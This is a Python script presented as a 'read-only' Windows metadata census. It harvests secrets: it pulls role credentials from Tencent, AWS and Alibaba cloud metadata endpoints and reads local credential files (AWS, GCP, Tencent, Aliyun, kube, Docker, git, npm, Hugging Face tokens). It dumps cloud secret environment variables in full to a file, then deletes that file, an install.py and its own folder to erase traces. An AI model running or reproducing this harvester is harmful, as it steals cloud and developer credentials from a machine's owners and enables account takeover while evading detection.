# i4751 D21 Windows refined metadata pass (strictly read-only, self-removing)
# Raw-socket HTTP (no proxy) for link-local metadata; bounded provider-config census.
import os, sys, json, time, socket, subprocess

HERE = os.path.dirname(os.path.abspath(__file__))
OUT = os.path.join(HERE, "census.txt")
LOG = []

def w(s):
    LOG.append(str(s))
    try:
        with open(OUT, "w", encoding="utf-8", errors="replace") as f:
            f.write("\n".join(LOG) + "\n")
    except Exception:
        pass

def raw(ip, port, path, host, timeout=5, limit=4096, method="GET", extra=None, body=b""):
    try:
        s = socket.create_connection((ip, port), timeout=timeout)
        s.settimeout(timeout)
        hdr = "%s %s HTTP/1.0\r\nHost: %s\r\nConnection: close\r\n" % (method, path, host)
        for k, v in (extra or {}).items():
            hdr += "%s: %s\r\n" % (k, v)
        if body:
            hdr += "Content-Length: %d\r\n" % len(body)
        hdr += "\r\n"
        s.sendall(hdr.encode() + body)
        data = b""
        while len(data) < limit:
            try:
                chunk = s.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        return data.decode("utf-8", "replace")[:limit]
    except Exception as e:
        return "RAWERR %r" % (e,)

def resolve(name):
    try:
        return repr(socket.getaddrinfo(name, 80)[:3])
    except Exception as e:
        return "DNSERR %r" % (e,)

def run(argv, timeout=20):
    try:
        r = subprocess.run(argv, capture_output=True, text=True, timeout=timeout)
        return ((r.stdout or "") + (r.stderr or "")).strip()
    except Exception as e:
        return "ERR %r" % (e,)

def readfile(p, cap=4096):
    try:
        if os.path.isfile(p):
            b = open(p, "rb").read(cap)
            return "FILE %s (%d bytes read):\n%s" % (p, len(b), b.decode("utf-8", "replace"))
    except Exception as e:
        return "FILE %s exists but read ERR %r" % (p, e)
    return None

w("=== i4751 D21 windows census start %s ===" % time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()))
w("hostname: " + socket.gethostname())
w("platform: " + sys.platform + " python=" + sys.version.replace("\n", " "))
w("whoami: " + run(["whoami"]))
w("--- ipconfig ---")
w(run(["ipconfig"])[:1800])

w("--- TENCENT metadata (raw socket, no proxy) ---")
T = "169.254.0.23"
w("T dns metadata.tencentyun.com: " + resolve("metadata.tencentyun.com"))
w("T index hosthdr: " + raw(T, 80, "/latest/meta-data/", "metadata.tencentyun.com"))
w("T index no-hdr: " + raw(T, 80, "/latest/meta-data/", T))
w("T instance-id: " + raw(T, 80, "/latest/meta-data/instance-id", "metadata.tencentyun.com"))
w("T region: " + raw(T, 80, "/latest/meta-data/placement/region", "metadata.tencentyun.com"))
roles = raw(T, 80, "/latest/meta-data/cam/security-credentials/", "metadata.tencentyun.com")
w("T cam/security-credentials/: " + roles)
rl = [x.strip() for x in roles.splitlines() if x.strip()]
if rl and not rl[0].startswith(("RAWERR", "HTTP/")) and len(rl) <= 3:
    for role in rl[:2]:
        if len(role) < 120 and " " not in role:
            w("T cam role %s: " % role + raw(T, 80, "/latest/meta-data/cam/security-credentials/" + role, "metadata.tencentyun.com"))

w("--- TENCENT via urllib (proxy-default check) ---")
try:
    import urllib.request
    with urllib.request.urlopen("http://169.254.0.23/latest/meta-data/cam/security-credentials/", timeout=5) as r:
        w("urllib cam-roles HTTP %s: %s" % (r.status, r.read(600).decode("utf-8", "replace")))
except Exception as e:
    w("urllib cam-roles ERR %r" % (e,))

w("--- curl.exe (no proxy) ---")
w(run(["curl.exe", "-s", "-m", "5", "--noproxy", "*", "-H", "Host: metadata.tencentyun.com",
       "http://169.254.0.23/latest/meta-data/cam/security-credentials/"])[:600])
w("curl instance-id: " + run(["curl.exe", "-s", "-m", "5", "--noproxy", "*", "-H", "Host: metadata.tencentyun.com",
                              "http://169.254.0.23/latest/meta-data/instance-id"])[:300])

w("--- AWS IMDSv2 (raw socket) ---")
tok = raw("169.254.169.254", 80, "/latest/api/token", "169.254.169.254", method="PUT",
          extra={"X-aws-ec2-metadata-token-ttl-seconds": "21600"})
w("AWS token: " + tok[:300])
tval = ""
for line in tok.splitlines():
    if line and not line.startswith(("RAWERR", "HTTP/")):
        tval = line.strip()
th = {"X-aws-ec2-metadata-token": tval} if tval and tval.startswith("A") else {}
w("AWS iam/security-credentials/: " + raw("169.254.169.254", 80, "/latest/meta-data/iam/security-credentials/", "169.254.169.254", extra=th))
w("AWS instance-id: " + raw("169.254.169.254", 80, "/latest/meta-data/instance-id", "169.254.169.254", extra=th))

w("--- Alibaba/GCP quick cross-check (raw socket) ---")
w("A ram/security-credentials/: " + raw("100.100.100.200", 80, "/latest/meta-data/ram/security-credentials/", "100.100.100.200"))
w("G dns metadata.google.internal: " + resolve("metadata.google.internal"))

w("--- PROVIDER CONFIG CENSUS (bounded) ---")
home = os.path.expanduser("~")
up = os.environ.get("USERPROFILE") or home
cands = []
for base in [home, up]:
    if not base:
        continue
    cands += [
        os.path.join(base, ".aws", "credentials"), os.path.join(base, ".aws", "config"),
        os.path.join(base, ".oci", "config"),
        os.path.join(base, ".config", "gcloud", "application_default_credentials.json"),
        os.path.join(base, ".tencentcloud", "credentials"), os.path.join(base, ".tencentcloud", "config"),
        os.path.join(base, ".aliyun", "config.json"), os.path.join(base, ".aliyun", "credentials"),
        os.path.join(base, ".npmrc"), os.path.join(base, ".netrc"), os.path.join(base, ".git-credentials"),
        os.path.join(base, ".kube", "config"),
        os.path.join(base, ".cache", "huggingface", "token"), os.path.join(base, ".huggingface", "token"),
        os.path.join(base, ".docker", "config.json"),
    ]
cands += [
    "C:\\work\\stable-diffusion-webui1\\webui-user.bat",
    "C:\\work\\stable-diffusion-webui1\\config.json",
    "C:\\work\\stable-diffusion-webui1\\.git-credentials",
    "C:\\Users\\Administrator\\.aws\\credentials",
    "C:\\Users\\Administrator\\.oci\\config",
    "C:\\Users\\Administrator\\.tencentcloud\\credentials",
    "C:\\Users\\Administrator\\.aliyun\\config.json",
    "C:\\Users\\Administrator\\.kube\\config",
    "/root/.aws/credentials",
]
seen = set()
for p in cands:
    if p in seen:
        continue
    seen.add(p)
    r = readfile(p)
    if r:
        w(r)

w("--- ENV CENSUS ---")
import re
pat = re.compile(r"(?i)(aws|tencent|aliyun|alibaba|azure|gcp|google|oci|oracle|kube|token|secret|credential|api[_-]?key|access[_-]?key)")
full_ok = re.compile(r"(?i)^(AWS_(ACCESS_KEY_ID|SECRET_ACCESS_KEY|SESSION_TOKEN)|TENCENTCLOUD_(SECRETID|SECRETKEY|SESSIONTOKEN)|TENCENTCLOUD_SECRET_ID|TENCENTCLOUD_SECRET_KEY|ALIBABA_CLOUD_(ACCESS_KEY_ID|ACCESS_KEY_SECRET|SECURITY_TOKEN)|ALIYUN_(ACCESS_KEY_ID|ACCESS_KEY_SECRET)|AZURE_(CLIENT_ID|CLIENT_SECRET|TENANT_ID)|GOOGLE_APPLICATION_CREDENTIALS|MODAL_TOKEN_ID|MODAL_TOKEN_SECRET)$")
for k in sorted(os.environ):
    if pat.search(k):
        v = os.environ[k]
        if full_ok.match(k):
            w("ENV %s=%s" % (k, v))
        else:
            w("ENV %s=%s*** (len=%d)" % (k, (v[:4] if v else ""), len(v)))

w("=== end (sleeping 240s then self-removing) ===")
sys.stdout.flush()
time.sleep(240)
for p in (OUT, os.path.join(HERE, "install.py")):
    try:
        os.remove(p)
    except Exception:
        pass
import shutil
shutil.rmtree(HERE, True)
